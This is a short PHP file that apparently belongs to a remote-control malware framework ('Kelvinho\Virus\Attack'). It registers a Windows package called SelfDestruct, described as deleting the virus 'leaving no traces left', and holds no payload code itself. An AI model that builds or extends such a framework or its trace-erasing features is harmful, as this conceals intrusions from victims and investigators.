<?php

use Kelvinho\Virus\Attack\Classes;
use Kelvinho\Virus\Attack\PackageRegistrar;

PackageRegistrar::register("win.oneTime.SelfDestruct", "\\Kelvinho\\Virus\\Attack\\Packages\\Windows\\OneTime\\SelfDestruct", "easy.SelfDestruct", __DIR__, [Classes::WINDOWS_ALONE], "Deletes the virus permanently, leaving no traces left.");
